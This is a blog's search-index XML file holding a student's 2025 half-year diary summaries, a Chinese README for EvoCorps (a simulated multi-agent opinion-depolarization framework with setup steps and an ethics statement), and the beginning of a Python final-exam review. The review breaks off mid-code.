<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2025年度下半年总结</title>
    <url>/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="2025"><a href="#2025" class="headerlink" title="2025"></a>2025</h1><h2 id="七八月"><a href="#七八月" class="headerlink" title="七八月"></a>七八月</h2><p>感觉挺充实的暑假，六月开始准备一下软件杯。后来还培训了一下数学建模，又去了科研实习。</p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/1.jpg" alt="暑假"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/2.jpg" alt="暑假"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/3.jpg" alt="暑假"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/4.jpg" alt="暑假"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/5.jpg" alt="暑假"></p>
<p>暑假去日本和杭州玩了一下，活过来了一点~</p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE7.jpg" alt="暑假"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE6.jpg" alt="暑假"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE8.jpg" alt="暑假"></p>
<p>和枫哥一起去苏州软件杯比赛，顺便去苏州玩了会~</p>
<h2 id="九月"><a href="#九月" class="headerlink" title="九月"></a>九月</h2><p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE10.jpg" alt="数学建模"></p>
<p>数学建模比赛，其实前期没有准备多少，也没怎么熬夜，后来拿了省二，还行吧~</p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE11.jpg" alt="陶喆演唱会"></p>
<p>陶喆演唱会~又能看演唱会了</p>
<h2 id="十月"><a href="#十月" class="headerlink" title="十月"></a>十月</h2><p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE12.jpg" alt="天津旅行1"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE13.jpg" alt="天津旅行2"></p>
<p>去天津逛了会~</p>
<h2 id="十一月"><a href="#十一月" class="headerlink" title="十一月"></a>十一月</h2><p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE14.jpg" alt="21岁生日1"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE15.jpg" alt="21岁生日2"></p>
<p>感谢好朋友陪我过21岁生日~第一次在海底捞过生日</p>
<h2 id="十二月"><a href="#十二月" class="headerlink" title="十二月"></a>十二月</h2><p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE16.jpg" alt="雪景1"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE17.jpg" alt="雪景2"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE18.jpg" alt="雪景3"></p>
<p>好久没看到雪了~</p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8B/%E5%9B%BE19.jpg" alt="期末复习"></p>
<p>然后就是期末月复习了</p>
]]></content>
      <categories>
        <category>年度总结</category>
      </categories>
      <tags>
        <tag>2025</tag>
        <tag>年度日记</tag>
      </tags>
  </entry>
  <entry>
    <title>2025年度上半年总结</title>
    <url>/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="2025"><a href="#2025" class="headerlink" title="2025"></a>2025</h1><h2 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h2><p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/1.jpg" alt="滑冰"></p>
<p>考完试第二天和朋友去速滑馆滑冰了~</p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/2.jpg" alt="剧本杀"></p>
<p>第一次玩七个小时剧本杀，猫岛挺好玩的~</p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/3.jpg" alt="滑雪1"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/4.jpg" alt="滑雪2"></p>
<p>好久没去滑雪了，第一次在北京滑雪，还挺好玩的~</p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/5.jpg" alt="西安1"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/6.jpg" alt="西安2"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/7.jpg" alt="西安3"></p>
<p>回家前先去西安玩了几天。虽然在旅游但是我还挺焦虑的，每天登录教务系统50次，毕竟还有几门成绩没出来~毕竟这时候我的均分并不是很高。</p>
<h2 id="2月"><a href="#2月" class="headerlink" title="2月"></a>2月</h2><p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/8.jpg" alt="开封1"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/9.jpg" alt="开封2"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/10.jpg" alt="开封3"></p>
<p>开学前几天和朋友一起去开封玩，之前一直没去过河南，第一次去还挺开心的，还看到了王婆说媒hhh。虽然没有进现场看打铁花但是在外面看到还是挺开心的。期间去面试了一个科研实习，被拒了，可能我当时均分太低了吧。没事~</p>
<h2 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h2><p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/11.jpg" alt="汪苏泷演唱会1"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/12.jpg" alt="汪苏泷演唱会2"></p>
<p>看了汪苏泷的演唱会，或许我从小到大都很喜欢音乐，看演唱会和去KTV或许是我最开心的时候~</p>
<h2 id="4月"><a href="#4月" class="headerlink" title="4月"></a>4月</h2><p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/13.jpg" alt="深圳1"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/14.jpg" alt="深圳2"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/15.jpg" alt="深圳3"></p>
<p>虽然大二下每周都有完整的3.5天时间。但是还是选择清明假期去了深圳旅游，哈哈哈真的好喜欢深圳，感觉比北京现代很多呀~</p>
<h2 id="5月"><a href="#5月" class="headerlink" title="5月"></a>5月</h2><p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/16.jpg" alt="内蒙1"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/17.jpg" alt="内蒙2"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/18.jpg" alt="内蒙3"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/19.jpg" alt="内蒙4"></p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/20.jpg" alt="内蒙5"></p>
<p>五一和好多朋友一起去内蒙旅游。每天晚上大家一起聊天打牌，真的好开心。我也是第一次去内蒙，感觉挺好玩的~</p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/23.jpg" alt="毛概"></p>
<p>毛概课的期中视频被曲老师推选去马院的比赛，我也是为了毛概期中第一次学的剪辑hhh~</p>
<h2 id="6月"><a href="#6月" class="headerlink" title="6月"></a>6月</h2><p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/21.jpg" alt="期末复习"></p>
<p>期末月，非常焦虑。之前的均分并不是很高，每天都在pua自己不停骂自己为什么学这么少，然后天天呆在图书馆。</p>
<p><img src="/2025/12/31/2025%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%E4%B8%8A/22.jpg" alt="比赛获奖"></p>
<p>五一前随便水的一个比赛，虽然感觉没啥用但是挺开心的~</p>
]]></content>
      <categories>
        <category>年度总结</category>
      </categories>
      <tags>
        <tag>2025</tag>
        <tag>年度日记</tag>
      </tags>
  </entry>
  <entry>
    <title>EvoCorps</title>
    <url>/2026/01/27/EvoCorps/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>相关仓库: <a href="https://github.com/ln2146/EvoCorps">https://github.com/ln2146/EvoCorps</a></p>
<div align="center">

<h1 id="EvoCorps"><a href="#EvoCorps" class="headerlink" title="EvoCorps"></a>EvoCorps</h1><p>  <strong>面向网络舆论去极化的进化式多智能体框架</strong><br>  <img src="/2026/01/27/EvoCorps/logo.png" alt="EvoCorps logo"></p>
  <p>
    <img alt="Python Version" src="https://img.shields.io/badge/python-3.9%2B-blue" />
    <img alt="License" src="https://img.shields.io/badge/license-MIT-green" />
    <img alt="Multi-Agent" src="https://img.shields.io/badge/agents-multi--agent-8a2be2" />
  </p>

</div>

<p><a id="overview"></a></p>
<h2 id="⚡-项目概述"><a href="#⚡-项目概述" class="headerlink" title="⚡ 项目概述"></a>⚡ 项目概述</h2><p><strong>EvoCorps</strong> 是一个面向<strong>网络舆论去极化</strong>的<strong>进化式多智能体框架</strong>。它并非传统的舆情检测或事后治理工具，而是在模拟环境中将舆论干预建模为一个<strong>持续演化的社会博弈过程</strong>：系统在传播过程中进行过程内调节，<strong>降低情绪对立、抑制极端观点扩散，并提升整体讨论的理性程度</strong>。</p>
<p>在 EvoCorps 中，<strong>不同智能体分工协作</strong>，模拟现实中的多角色舆论参与者，协同完成<strong>舆论监测、局势建模、干预规划、基于事实的内容生成与多角色传播</strong>等任务。框架内置<strong>检索增强的集体认知机制（论据知识库 + 行动—结果记忆）</strong>，并通过<strong>基于反馈的进化式学习</strong>，使系统能够随环境变化自适应优化干预策略。</p>
<p><a id="problem"></a></p>
<h2 id="🧩-我们试图解决的问题"><a href="#🧩-我们试图解决的问题" class="headerlink" title="🧩 我们试图解决的问题"></a>🧩 我们试图解决的问题</h2><p>在线社交平台的讨论，往往会在“同质性互动 + 推荐机制”的共同作用下逐步分化；当有组织的恶意账号在早期注入并放大情绪化叙事时，这种分化会被进一步加速。</p>
<p><img src="/2026/01/27/EvoCorps/background.svg" alt="Motivation: from normal communication to polarization under malicious attack"></p>
<p>该图概括了我们关注的动机：从正常交流出发，在恶意攻击介入后，群体讨论可能演化为难以调和的对立。由于情绪传播往往快于事实澄清，等到仅依赖被动检测、事后标记、删除时，讨论轨迹常已经固定，干预效果有限。</p>
<p>现有网络舆论相关技术普遍存在以下局限：</p>
<ol>
<li>以事后检测为主，响应滞后，难以影响传播过程</li>
<li>策略静态，难以应对有组织、持续演化的恶意行为</li>
<li>缺乏闭环反馈，无法评估干预是否真正改变舆论走向</li>
</ol>
<p>EvoCorps 的目标，是让舆论干预从“发现问题再处理”转向“在传播过程中持续调节”。</p>
<p><a id="how-it-works"></a></p>
<h2 id="🛠️-EvoCorps-如何工作"><a href="#🛠️-EvoCorps-如何工作" class="headerlink" title="🛠️ EvoCorps 如何工作"></a>🛠️ EvoCorps 如何工作</h2><p>舆论监测 → 局势建模 → 干预策略规划 → 基于事实的内容生成 → 多角色传播 → 效果反馈与策略进化</p>
<p>本项目采用 <strong>Analyst、Strategist、Leader、Amplifier</strong> 的角色分工，将“规划—生成—传播—反馈”串联为协同干预流程，并在检索增强的集体认知内核支持下复用论据与历史经验。</p>
<p><img src="/2026/01/27/EvoCorps/framework.svg" alt="EvoCorps Framework"></p>
<h3 id="✨-主要特性："><a href="#✨-主要特性：" class="headerlink" title="✨ 主要特性："></a>✨ 主要特性：</h3><ul>
<li><strong>♟️ 角色分工明确的协同干预团队</strong>：由 Analyst、Strategist、Leader、Amplifier 分工协作，把“监测与判断 → 制定策略 → 生成内容 → 多角色扩散 → 效果评估”串成一条可执行的闭环流程，让干预能够在传播过程中持续推进与调整。</li>
<li><strong>🧠 检索增强的事实与经验支撑</strong>：系统维护证据知识库，并记录每次行动带来的结果；生成内容时优先检索可核查的事实与论据，同时参考历史上更有效的做法，提升内容可靠性与团队一致性。</li>
<li><strong>🧬 基于反馈的自适应演化</strong>：每轮结束后评估干预是否让讨论更理性、情绪更稳定、观点更温和，并据此强化有效策略、弱化无效策略，使系统在对抗注入和环境变化下逐步学会更合适的应对方式。</li>
</ul>
<p><a id="evaluation"></a></p>
<h2 id="📊-实验验证"><a href="#📊-实验验证" class="headerlink" title="📊 实验验证"></a>📊 实验验证</h2><p>我们在 <strong>MOSAIC</strong> 社交模拟平台上对 EvoCorps 进行了系统评估，并在包含<strong>负面新闻传播</strong>与<strong>恶意信息放大</strong>的场景中进行测试。结果表明，在<strong>情绪极化程度</strong>、<strong>观点极端化水平</strong>与<strong>论证理性</strong>等关键指标上，EvoCorps 均优于事后干预方法。</p>
<h3 id="系统干预效果（示意图）"><a href="#系统干预效果（示意图）" class="headerlink" title="系统干预效果（示意图）"></a>系统干预效果（示意图）</h3><p><img src="/2026/01/27/EvoCorps/Sentiment_trajectories.png" alt="Sentiment_trajectories"></p>
<p>上述图表对比了四种设置下的情绪随时间变化情况：Case 1（仅普通用户自然讨论，无恶意水军也无干预）、Case 2（恶意水军放大偏置信息，无防护）、Case 3（在Case 2基础上采用事后审核）、Case 4（在Case 2基础上由EvoCorps进行实时的、角色协同的主动干预）。虚线表示平台开始注入事实澄清的时间点（第5个时间步）；在对抗放大场景中，缺乏保护或仅事后干预的情绪更难恢复，而 EvoCorps能更早拉住下滑趋势，使讨论更快趋于稳定。</p>
<hr>
<h2 id="📖-目录"><a href="#📖-目录" class="headerlink" title="📖 目录"></a>📖 目录</h2><ul>
<li><a href="#evocorps">EvoCorps</a><ul>
<li><a href="#-%E9%A1%B9%E7%9B%AE%E6%A6%82%E8%BF%B0">⚡ 项目概述</a></li>
<li><a href="#-%E6%88%91%E4%BB%AC%E8%AF%95%E5%9B%BE%E8%A7%A3%E5%86%B3%E7%9A%84%E9%97%AE%E9%A2%98">🧩 我们试图解决的问题</a></li>
<li><a href="#%EF%B8%8F-evocorps-%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C">🛠️ EvoCorps 如何工作</a><ul>
<li><a href="#-%E4%B8%BB%E8%A6%81%E7%89%B9%E6%80%A7">✨ 主要特性：</a></li>
</ul>
</li>
<li><a href="#-%E5%AE%9E%E9%AA%8C%E9%AA%8C%E8%AF%81">📊 实验验证</a><ul>
<li><a href="#%E7%B3%BB%E7%BB%9F%E5%B9%B2%E9%A2%84%E6%95%88%E6%9E%9C%E7%A4%BA%E6%84%8F%E5%9B%BE">系统干预效果（示意图）</a></li>
</ul>
</li>
<li><a href="#-%E7%9B%AE%E5%BD%95">📖 目录</a></li>
<li><a href="#-%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84">📂 项目结构</a></li>
<li><a href="#-%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B">🚀 快速开始</a><ul>
<li><a href="#1-%E5%88%9B%E5%BB%BA%E7%8E%AF%E5%A2%83">1. 创建环境</a></li>
<li><a href="#2-%E5%AE%89%E8%A3%85%E4%BE%9D%E8%B5%96%E5%8C%85">2. 安装依赖包</a></li>
<li><a href="#3-%E9%85%8D%E7%BD%AE-api-%E4%B8%8E%E9%80%89%E6%8B%A9%E6%A8%A1%E5%9E%8B">3. 配置 API 与选择模型</a></li>
<li><a href="#4-%E7%B3%BB%E7%BB%9F%E8%BF%90%E8%A1%8C%E6%AD%A5%E9%AA%A4">4. 系统运行步骤</a></li>
<li><a href="#5-%E5%90%AF%E5%8A%A8%E5%89%8D%E7%AB%AF%E5%8F%AF%E8%A7%86%E5%8C%96%E7%95%8C%E9%9D%A2">5. 启动前端可视化界面</a></li>
</ul>
</li>
<li><a href="#%EF%B8%8F-%E4%BC%A6%E7%90%86%E5%A3%B0%E6%98%8E">⚖️ 伦理声明</a></li>
</ul>
</li>
</ul>
<hr>
<p><a id="project-structure"></a></p>
<h2 id="📂-项目结构"><a href="#📂-项目结构" class="headerlink" title="📂 项目结构"></a>📂 项目结构</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">EvoCorps/</span><br><span class="line">├── agent_memory_exports/           # 导出的智能体记忆分析</span><br><span class="line">├── cognitive_memory/               # 认知记忆轨迹</span><br><span class="line">├── config/                         # 运行配置</span><br><span class="line">├── configs/                        # 实验与系统配置</span><br><span class="line">├── data/                           # 数据与样例</span><br><span class="line">├── database/                       # SQLite 数据库</span><br><span class="line">├── evidence_database/              # 证据数据库与检索配置</span><br><span class="line">├── exported_content/               # 导出内容与图表</span><br><span class="line">├── human_study/                    # 人类研究数据与分析</span><br><span class="line">├── models/                         # 模型与权重</span><br><span class="line">├── personas/                       # 人设与角色</span><br><span class="line">├── result/                         # 结果输出</span><br><span class="line">├── scripts/                        # 辅助脚本</span><br><span class="line">├── src/                            # 核心代码</span><br><span class="line">│   ├── agents/                     # Agent 实现</span><br><span class="line">│   ├── config/                     # 配置模块</span><br><span class="line">│   ├── database/                   # 数据库相关模块</span><br><span class="line">│   ├── retriver/                   # 检索相关模块</span><br><span class="line">│   ├── utils_package/              # 工具包</span><br><span class="line">│   ├── main.py                     # 系统主入口</span><br><span class="line">│   ├── start_database_service.py   # 启动数据库服务</span><br><span class="line">│   ├── keys.py                     # API 密钥配置</span><br><span class="line">│   ├── opinion_balance_launcher.py # 独立启动舆论平衡系统</span><br><span class="line">├── requirements.txt                # 依赖列表</span><br><span class="line">├── LICENSE</span><br><span class="line">└── README.md</span><br></pre></td></tr></table></figure>

<h2 id="🚀-快速开始"><a href="#🚀-快速开始" class="headerlink" title="🚀 快速开始"></a>🚀 快速开始</h2><h3 id="1-创建环境"><a href="#1-创建环境" class="headerlink" title="1. 创建环境"></a>1. 创建环境</h3><p>使用 Conda：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建 conda 环境</span></span><br><span class="line">conda create -n your_conda_name python=3.12</span><br><span class="line">conda activate your_conda_name</span><br></pre></td></tr></table></figure>

<h3 id="2-安装依赖包"><a href="#2-安装依赖包" class="headerlink" title="2. 安装依赖包"></a>2. 安装依赖包</h3><p>基础依赖安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<h3 id="3-配置-API-与选择模型"><a href="#3-配置-API-与选择模型" class="headerlink" title="3. 配置 API 与选择模型"></a>3. 配置 API 与选择模型</h3><p>在 <code>src/keys.py</code>文件中根据提示填写对应的 API-KEY 与 BASE-URL。并在<code>src/multi_model_selector.py</code>中配置相应的模型。<br>（示例：在<code>src/keys.py</code>配置deepseek的API-KEY 与 BASE-URL，那么在<code>src/multi_model_selector.py</code>中模型可选择DEFAULT_POOL &#x3D; [“deepseek-chat”]；在<code>src/keys.py</code>配置gemini的API-KEY 与 BASE-URL，那么在<code>src/multi_model_selector.py</code>中模型可选择DEFAULT_POOL &#x3D; [“gemini-2.0-flash”]；embedding模型可选择OpenAI的text-embedding-3-large、智谱的embedding-3等）</p>
<h3 id="4-系统运行步骤"><a href="#4-系统运行步骤" class="headerlink" title="4. 系统运行步骤"></a>4. 系统运行步骤</h3><ul>
<li><p>开启数据库服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建终端</span></span><br><span class="line">python src/start_database_service.py</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动主程序，按照终端提示信息选择运行场景</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建终端</span></span><br><span class="line">python src/main.py</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果需要使用舆论平衡系统,可按照提示执行以下操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建终端</span></span><br><span class="line">python src/opinion_balance_launcher.py</span><br><span class="line"><span class="comment"># 输入start，启动监控</span></span><br><span class="line">start</span><br><span class="line"><span class="comment"># 输入auto-status，实时打印行动的日志</span></span><br><span class="line">auto-status</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-启动前端可视化界面"><a href="#5-启动前端可视化界面" class="headerlink" title="5. 启动前端可视化界面"></a>5. 启动前端可视化界面</h3><ul>
<li><p>启动后端API服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建终端</span></span><br><span class="line">python frontend_api.py</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动前端开发服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 新建终端，进入frontend目录</span></span><br><span class="line"><span class="built_in">cd</span> frontend</span><br><span class="line">npm install  <span class="comment"># 首次运行需要安装依赖</span></span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>访问前端界面</p>
</li>
</ul>
<p>打开浏览器访问 <code>http://localhost:3000</code> 或 <code>http://localhost:3001</code>（根据终端提示的端口）</p>
<p>前端界面提供以下功能：</p>
<ul>
<li><strong>主页</strong>：系统概览和快速导航</li>
<li><strong>实验设置</strong>：配置实验参数和启动服务</li>
<li><strong>数据监控</strong>：实时查看系统运行状态和统计数据</li>
<li><strong>实验管理</strong>：保存和加载实验快照</li>
<li><strong>关系图谱</strong>：可视化用户、帖子、评论之间的关系网络</li>
<li><strong>采访功能</strong>：向模拟用户发送问卷并收集回答</li>
</ul>
<p><a id="ethics"></a></p>
<h2 id="⚖️-伦理声明"><a href="#⚖️-伦理声明" class="headerlink" title="⚖️ 伦理声明"></a>⚖️ 伦理声明</h2><p>本研究在模拟环境中探讨在线讨论去极化的机制，使用的是公开可获取的数据集以及合成智能体之间的交互过程。研究过程中不涉及任何人类受试者实验，也不收集或处理任何可识别个人身份的信息。本研究的主要目标在于加深对平台治理中协调式干预机制的理解，而非开发或部署具有欺骗性的影响行动。</p>
<p>EvoCorps 被定位为一种治理辅助方法，旨在帮助在线平台应对诸如虚假信息传播或对抗性操纵等有组织、恶意的行为。在此类情境下，平台治理主体本身可能需要具备协同能力和风格多样性，以实现有效且适度的响应。因此，本研究将协调能力与响应多样性视为治理机制进行考察，而非将其作为制造人为共识或操纵舆论的工具。</p>
<p>我们明确反对在任何现实世界部署中使用欺骗性策略。尽管本研究的模拟引入了多样化的智能体角色，用以探索影响力动态的理论边界，但任何实际应用都必须严格遵循透明性与问责原则。自动化智能体应被清晰标识为基于人工智能的助手或治理工具（例如经认证的事实核查机器人），不得冒充人类用户，也不得隐瞒其人工属性。</p>
<p>任何受本研究启发的系统部署，都应当与现有的平台治理流程相结合，并遵循平台特定的政策、透明性要求以及持续审计机制。这些保障措施对于降低潜在的非预期危害至关重要，包括差异化影响、用户信任受损，或由自动化判断引发的错误。本研究中 EvoCorps 的预期用途在于支持负责任、透明且可问责的治理干预，而非误导用户或制造虚假共识。</p>
]]></content>
      <categories>
        <category>科研相关</category>
      </categories>
      <tags>
        <tag>科研工作</tag>
        <tag>EvoCorps</tag>
        <tag>舆论平衡</tag>
        <tag>去极化</tag>
      </tags>
  </entry>
  <entry>
    <title>Python期末复习</title>
    <url>/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>授课: 尚煜茗</p>
<h1 id="Python程序实例解析"><a href="#Python程序实例解析" class="headerlink" title="Python程序实例解析"></a><strong>Python程序实例解析</strong></h1><h2 id="温度转换练习"><a href="#温度转换练习" class="headerlink" title="温度转换练习"></a><strong>温度转换练习</strong></h2><p>根据华氏和摄氏温度定义，转换公式如下：C &#x3D; ( F – 32 ) &#x2F; 1.8，F &#x3D; C * 1.8 + 32。其中，C表示摄氏温度，F表示华氏温度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">temp_str=<span class="built_in">input</span>(<span class="string">&quot;请输入带符号温度值：&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> temp_str[-<span class="number">1</span>] <span class="keyword">in</span> [<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;f&#x27;</span>]:</span><br><span class="line">   C=(<span class="built_in">eval</span>(temp_str[<span class="number">0</span>:-<span class="number">1</span>])-<span class="number">32</span>)/<span class="number">1.8</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;转换后的温度是&#123;:.2f&#125;C&quot;</span>.<span class="built_in">format</span>(C))</span><br><span class="line"><span class="keyword">elif</span> temp_str[-<span class="number">1</span>] <span class="keyword">in</span> [<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]:</span><br><span class="line">   F=<span class="number">1.8</span>*<span class="built_in">eval</span>(temp_str[<span class="number">0</span>:-<span class="number">1</span>])+<span class="number">32</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;转换后的温度是&#123;:.2f&#125;F&quot;</span>.<span class="built_in">format</span>(F))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;输入格式错误&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>根据父母的身高可以估算一下孩子的身高，计算公式如下：男孩身高&#x3D;（父亲身高+母亲身高+13）÷2，然后加或者减5公分。女孩身高&#x3D;（父亲身高+母亲身高－13）÷2，然后加或者减5公分。设：父亲身高179，母亲身高165，计算他们生男孩和女孩，分别预测身高是多少？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入父母身高</span></span><br><span class="line">father_height = <span class="number">179</span></span><br><span class="line">mother_height = <span class="number">165</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算男孩身高</span></span><br><span class="line">boy_height = (father_height + mother_height + <span class="number">13</span>) / <span class="number">2</span></span><br><span class="line">boy_min = boy_height - <span class="number">5</span></span><br><span class="line">boy_max = boy_height + <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算女孩身高</span></span><br><span class="line">girl_height = (father_height + mother_height - <span class="number">13</span>) / <span class="number">2</span></span><br><span class="line">girl_min = girl_height - <span class="number">5</span></span><br><span class="line">girl_max = girl_height + <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;父母身高：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;父亲：<span class="subst">&#123;father_height&#125;</span>cm，母亲：<span class="subst">&#123;mother_height&#125;</span>cm&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n孩子预测身高：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;男孩：<span class="subst">&#123;boy_height:<span class="number">.1</span>f&#125;</span>cm（范围：<span class="subst">&#123;boy_min:<span 